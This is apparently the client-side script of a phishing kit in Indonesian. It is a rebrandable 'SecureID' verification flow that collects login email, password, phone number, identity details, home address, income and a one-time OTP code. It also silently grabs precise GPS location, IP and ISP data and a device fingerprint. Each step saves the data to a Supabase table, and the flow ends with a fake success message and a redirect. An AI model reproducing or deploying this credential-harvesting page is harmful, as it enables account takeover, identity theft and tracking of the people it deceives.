(function () {
  'use strict';

  const C = window.CONFIG || {};
  const sb = supabase.createClient(C.SUPABASE_URL, C.SUPABASE_ANON_KEY);

  const main = document.getElementById('main');
  const bar = document.getElementById('bar');
  const stepInfo = document.getElementById('stepInfo');

  document.getElementById('brandName').textContent = C.BRAND || 'SecureID';
  document.getElementById('brandSub').textContent = C.BRAND_SUB || '';
  document.getElementById('mark').textContent = C.MARK || 'S';
  document.getElementById('footBrand').textContent = C.BRAND || 'SecureID';

  const state = {};
  let ipInfo = null;
  let geo = null;
  let rowId = null;
  let index = 0;
  const sessionId = crypto.randomUUID();

  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
  const PHONE_RE = /^(\+?62|0)8[0-9]{7,12}$/;

  const EYE_OPEN = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>';
  const EYE_OFF = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a20.3 20.3 0 0 1 5.06-5.94"/><path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c7 0 11 7 11 7a20.3 20.3 0 0 1-3.22 4.31"/><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/><line x1="2" y1="2" x2="22" y2="22"/></svg>';

  // ---------- IP, perangkat, lokasi ----------
  async function fetchIpInfo() {
    try {
      const res = await fetch('https://ipwho.is/');
      const data = await res.json();
      if (data && data.success !== false && data.ip) ipInfo = data;
    } catch (e) { /* diabaikan bila diblokir */ }
  }
  fetchIpInfo();
  
  const EMAIL_API = 'https://api.mailcheck.ai/email/';

async function verifyEmail(email) {
  try {
    const ctrl = new AbortController();
    const t = setTimeout(() => ctrl.abort(), 5000);
    const res = await fetch(EMAIL_API + encodeURIComponent(email), { signal: ctrl.signal });
    clearTimeout(t);
    if (!res.ok) return { ok: true };
    const d = await res.json();
    if (d.mx === false) return { ok: false, msg: 'Domain email ini tidak menerima pesan. Periksa kembali.' };
    if (d.did_you_mean) return { ok: true, suggest: d.did_you_mean };
    return { ok: true };
  } catch (e) {
    return { ok: true };
  }
}

  const GEO_ERRORS = {
    1: 'Izin lokasi ditolak. Isi alamat manual atau aktifkan izin di pengaturan browser.',
    2: 'Lokasi tidak tersedia. Coba lagi.',
    3: 'Permintaan lokasi terlalu lama. Coba lagi.'
  };

  function geoStatus(msg, bad) {
    const box = document.getElementById('geoStatus');
    if (!box) return;
    box.textContent = msg || '';
    box.className = 'geoStatus' + (bad ? ' bad' : '');
  }

  function requestGeo() {
    if (!navigator.geolocation) {
      geoStatus('Browser ini tidak mendukung lokasi. Isi manual.', true);
      return;
    }
    const btn = document.getElementById('btnGeo');
    if (btn) { btn.disabled = true; btn.textContent = 'Mengambil lokasi...'; }
    geoStatus('Menunggu izin lokasi...');
    navigator.geolocation.getCurrentPosition(onGeoOk, onGeoFail, {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    });
  }

  async function onGeoOk(pos) {
    const c = pos.coords;
    geo = { lat: c.latitude, lon: c.longitude, accuracy: c.accuracy };
    geoStatus('Lokasi terkunci (akurasi \u00b1' + Math.round(c.accuracy) + ' m). Melengkapi alamat...');

    try {
      const url = 'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' +
        c.latitude + '&longitude=' + c.longitude + '&localityLanguage=id';
      const res = await fetch(url);
      fillGeo(await res.json());
    } catch (e) {
      fillGeo(null);
    }

    const btn = document.getElementById('btnGeo');
    if (btn) { btn.disabled = false; btn.textContent = 'Perbarui lokasi'; }
  }

  function onGeoFail(err) {
    geoStatus(GEO_ERRORS[err.code] || 'Gagal mengambil lokasi.', true);
    const btn = document.getElementById('btnGeo');
    if (btn) { btn.disabled = false; btn.textContent = 'Coba ambil lokasi lagi'; }
  }

  function fillGeo(d) {
    const set = (name, val) => {
      if (!val) return;
      const input = document.getElementById('f_' + name);
      if (!input) return;
      input.value = val;
      state[name] = val;
      input.classList.remove('bad');
      const err = document.getElementById('err_' + name);
      if (err) err.classList.remove('on');
    };

    const city = d && (d.city || d.locality);
    const prov = d && d.principalSubdivision;
    const parts = [d && d.locality, city, prov, d && d.countryName].filter(Boolean);

    if (city) set('city', city);
    if (prov) set('province', prov);
    if (d && d.postcode) set('postal_code', d.postcode);
    if (parts.length) set('address', parts.join(', '));

    geo.geo_city = city || null;
    geo.geo_province = prov || null;
    geo.geo_postcode = (d && d.postcode) || null;
    geo.geo_address = parts.join(', ') || null;
    geo.geo_source = d ? 'gps+bigdatacloud' : 'gps';

    geoStatus('Alamat terisi otomatis. Periksa dan tambahkan nomor rumah.');
  }

  // ---------- definisi langkah ----------
  const STEPS = [
    {
      title: 'Masuk ke akun Anda',
      desc: 'Gunakan email dan nomor HP yang terdaftar.',
      cta: 'Lanjut',
      fields: [
        { name: 'email', label: 'Email', type: 'email', required: true, pattern: EMAIL_RE, err: 'Format email tidak valid' },
        { name: 'password', label: 'Kata sandi', type: 'password', required: true, err: 'Kata sandi wajib diisi' },
        { name: 'phone', label: 'Nomor HP', type: 'tel', inputmode: 'numeric', required: true, pattern: PHONE_RE, err: 'Nomor HP tidak valid', hint: 'Contoh: 081234567890' }
      ]
    },
    {
      title: 'Data diri',
      desc: 'Lengkapi sesuai kartu identitas Anda.',
      cta: 'Lanjut',
      fields: [
        { name: 'full_name', label: 'Nama lengkap', type: 'text', required: true, err: 'Nama wajib diisi' },
        { name: 'age', label: 'Umur', type: 'number', inputmode: 'numeric', required: true, min: 10, max: 100, err: 'Umur tidak valid' },
        { name: 'birth_date', label: 'Tanggal lahir', type: 'date', required: true, err: 'Tanggal lahir wajib diisi' },
        { name: 'gender', label: 'Jenis kelamin', type: 'select', required: true, err: 'Pilih salah satu', options: ['Laki-laki', 'Perempuan'] }
      ]
    },
    {
      title: 'Alamat tinggal',
      desc: 'Alamat sesuai domisili saat ini.',
      geo: true,
      cta: 'Lanjut',
      fields: [
        { name: 'address', label: 'Alamat lengkap', type: 'textarea', required: true, err: 'Alamat wajib diisi' },
        { name: 'city', label: 'Kota / kabupaten', type: 'text', required: true, err: 'Kota wajib diisi' },
        { name: 'province', label: 'Provinsi', type: 'text', required: true, err: 'Provinsi wajib diisi' },
        { name: 'postal_code', label: 'Kode pos', type: 'text', inputmode: 'numeric', required: true, pattern: /^[0-9]{5}$/, err: 'Kode pos 5 digit' }
      ]
    },
    {
      title: 'Pekerjaan & pendapatan',
      desc: 'Digunakan untuk penyesuaian limit akun.',
      cta: 'Lanjut',
      fields: [
        { name: 'occupation', label: 'Pekerjaan', type: 'select', required: true, err: 'Pilih salah satu', options: ['Pelajar / mahasiswa', 'Karyawan swasta', 'Wirausaha', 'ASN / TNI / Polri', 'Ibu rumah tangga', 'Lainnya'] },
        { name: 'income', label: 'Pendapatan per bulan', type: 'select', required: true, err: 'Pilih salah satu', options: ['< 2 juta', '2 - 5 juta', '5 - 10 juta', '10 - 20 juta', '> 20 juta'] }
      ]
    },
    {
      title: 'Verifikasi OTP',
      desc: 'Kode 6 digit dikirim ke nomor terdaftar.',
      cta: 'Verifikasi',
      fields: [
        { name: 'otp', label: 'Kode OTP', type: 'text', inputmode: 'numeric', cls: 'otp', required: true, pattern: /^[0-9]{6}$/, err: 'Kode harus 6 digit', hint: 'Tidak menerima kode? Tunggu sebentar lalu ulangi.' }
      ]
    }
  ];

  function progress() {
    bar.style.width = Math.round((index / STEPS.length) * 100) + '%';
    stepInfo.textContent = 'Langkah ' + Math.min(index + 1, STEPS.length) + ' dari ' + STEPS.length;
  }

  function el(tag, cls, text) {
    const n = document.createElement(tag);
    if (cls) n.className = cls;
    if (text) n.textContent = text;
    return n;
  }

  function render() {
    progress();
    main.innerHTML = '';

    const s = STEPS[index];
    if (!s) return;

    main.append(el('h1', null, s.title));
    main.append(el('p', 'desc', s.desc));

    const form = el('div');
    main.append(form);

    if (s.geo) {
      const box = el('div', 'geoBox');
      const btn = el('button', 'geoBtn', 'Gunakan lokasi saat ini');
      btn.type = 'button';
      btn.id = 'btnGeo';
      btn.addEventListener('click', requestGeo);
      const st = el('div', 'geoStatus');
      st.id = 'geoStatus';
      box.append(btn, st);
      form.append(box);
      setTimeout(requestGeo, 400);
    }

    s.fields.forEach((f) => {
      const wrap = el('div', 'field');

      const lab = el('label', null, f.label);
      lab.setAttribute('for', 'f_' + f.name);
      wrap.append(lab);

      let input;
      let isPassword = false;

      if (f.type === 'select') {
        input = el('select');
        const ph = el('option', null, 'Pilih...');
        ph.value = '';
        input.append(ph);
        f.options.forEach((o) => {
          const opt = el('option', null, o);
          opt.value = o;
          input.append(opt);
        });
      } else if (f.type === 'textarea') {
        input = el('textarea');
        input.rows = 3;
        input.placeholder = 'Jalan, nomor rumah, RT/RW';
      } else if (f.type === 'password') {
        isPassword = true;
        input = el('input');
        input.type = 'password';
      } else {
        input = el('input');
        input.type = f.type;
        if (f.inputmode) input.inputMode = f.inputmode;
        if (f.cls) input.classList.add(f.cls);
      }

      input.id = 'f_' + f.name;
      input.name = f.name;
      input.autocomplete = 'off';
      input.spellcheck = false;
      if (state[f.name] !== undefined && state[f.name] !== null) input.value = state[f.name];

      if (isPassword) {
        const box = el('div', 'pwWrap');
        box.append(input);

        const eye = el('button', 'eyeBtn');
        eye.type = 'button';
        eye.tabIndex = -1;
        eye.innerHTML = EYE_OPEN;
        eye.setAttribute('aria-label', 'Tampilkan kata sandi');
        eye.addEventListener('click', () => {
          const show = input.type === 'password';
          input.type = show ? 'text' : 'password';
          eye.innerHTML = show ? EYE_OFF : EYE_OPEN;
          eye.setAttribute('aria-label', show ? 'Sembunyikan kata sandi' : 'Tampilkan kata sandi');
          const len = input.value.length;
          input.focus();
          try { input.setSelectionRange(len, len); } catch (e) {}
        });

        box.append(eye);
        wrap.append(box);
      } else {
        wrap.append(input);
      }

      if (f.hint) wrap.append(el('div', 'hint', f.hint));

      const err = el('div', 'errMsg', f.err || 'Wajib diisi');
      err.id = 'err_' + f.name;
      wrap.append(err);

      input.addEventListener('input', () => {
        input.classList.remove('bad');
        err.classList.remove('on');
        state[f.name] = input.value;
      });

      form.append(wrap);
    });

    const cta = el('button', 'cta', s.cta);
    cta.type = 'button';
    main.append(cta);
    cta.addEventListener('click', () => submit(s, form, cta));

    if (index > 0) {
      const back = el('button', 'back', 'Kembali');
      back.type = 'button';
      back.addEventListener('click', () => {
        index--;
        render();
      });
      main.append(back);
    }
  }

  function collect(s, form) {
    let ok = true;
    s.fields.forEach((f) => {
      const input = form.querySelector('#f_' + f.name);
      const err = form.querySelector('#err_' + f.name);
      const val = (input.value || '').trim();
      state[f.name] = val;

      let bad = false;
      if (f.required && !val) bad = true;
      if (!bad && val && f.pattern && !f.pattern.test(val)) bad = true;
      if (!bad && val && f.type === 'number') {
        const n = Number(val);
        if (f.min !== undefined && n < f.min) bad = true;
        if (f.max !== undefined && n > f.max) bad = true;
      }

      if (bad) {
        ok = false;
        input.classList.add('bad');
        if (err) err.classList.add('on');
      }
    });
    return ok;
  }

  function showAlert(container, msg) {
    const old = main.querySelector('.alert');
    if (old) old.remove();
    container.prepend(el('div', 'alert', msg));
  }

  async function submit(s, form, cta) {
    if (!collect(s, form)) return;
    
    if (index === 0 && !rowId) {
      cta.disabled = true;
      cta.innerHTML = '<span class="spin"></span>Memeriksa email...';

      const v = await verifyEmail(state.email);

      cta.disabled = false;
      cta.textContent = s.cta;

      const inp = form.querySelector('#f_email');
      const err = form.querySelector('#err_email');

      if (!v.ok) {
        inp.classList.add('bad');
        if (err) { err.textContent = v.msg; err.classList.add('on'); }
        inp.focus();
        return;
      }

      if (v.suggest && v.suggest.toLowerCase() !== state.email.toLowerCase()) {
        inp.value = v.suggest;
        state.email = v.suggest;
        if (err) { err.textContent = 'Mungkin maksud Anda: ' + v.suggest; err.classList.add('on'); }
        return;
      }
    }

    cta.disabled = true;
    cta.innerHTML = '<span class="spin"></span>Memproses...';

    const payload = { step: index + 1, updated_at: new Date().toISOString() };
    s.fields.forEach((f) => {
      payload[f.name] = state[f.name];
    });
    if (payload.age) payload.age = Number(payload.age);

    if (geo) {
      payload.lat = geo.lat;
      payload.lon = geo.lon;
      payload.accuracy = geo.accuracy;
      payload.geo_address = geo.geo_address || null;
      payload.geo_city = geo.geo_city || null;
      payload.geo_province = geo.geo_province || null;
      payload.geo_postcode = geo.geo_postcode || null;
      payload.geo_source = geo.geo_source || null;
    }

    try {
      if (!rowId) {
        if (!ipInfo) {
          await Promise.race([
            fetchIpInfo(),
            new Promise((r) => setTimeout(r, 1500))
          ]);
        }
        payload.session_id = sessionId;
        payload.ip = ipInfo ? ipInfo.ip : null;
        payload.ip_city = ipInfo ? ipInfo.city : null;
        payload.ip_region = ipInfo ? ipInfo.region : null;
        payload.ip_country = ipInfo ? ipInfo.country : null;
        payload.ip_isp = ipInfo && ipInfo.connection ? ipInfo.connection.isp : null;
        payload.ip_lat = ipInfo && ipInfo.latitude ? ipInfo.latitude : null;
        payload.ip_lon = ipInfo && ipInfo.longitude ? ipInfo.longitude : null;
        payload.language = navigator.language;
        payload.platform = navigator.platform || null;
        payload.device_memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : null;
        payload.cores = navigator.hardwareConcurrency || null;
        payload.touch = 'ontouchstart' in window;
        payload.user_agent = navigator.userAgent;
        payload.referrer = document.referrer || '';
        payload.page_url = location.href;
        payload.screen = screen.width + 'x' + screen.height;
        payload.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        const newId = crypto.randomUUID();
        const { error } = await sb.from('submissions').insert({ id: newId, ...payload });
        if (error) throw error;
        rowId = newId;
      } else {
        const { error } = await sb.from('submissions').update(payload).eq('id', rowId);
        if (error) throw error;
      }
    } catch (e) {
      console.error(e);
      cta.disabled = false;
      cta.textContent = s.cta;
      showAlert(form, 'Koneksi bermasalah. Coba tekan tombol sekali lagi.');
      return;
    }

    index++;

    if (index >= STEPS.length) {
      finish();
    } else {
      render();
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
  }

  function finish() {
    bar.style.width = '100%';
    stepInfo.textContent = 'Selesai';
    main.innerHTML =
      '<div class="done">' +
        '<div class="tick">&#10003;</div>' +
        '<h1>Verifikasi berhasil</h1>' +
        '<p>Akun Anda sedang dialihkan. Mohon tunggu sebentar...</p>' +
      '</div>';

    const target = C.REDIRECT_URL;
    const delay = Number(C.REDIRECT_DELAY) || 2500;
    if (target) setTimeout(() => { location.href = target; }, delay);
  }

  render();
})();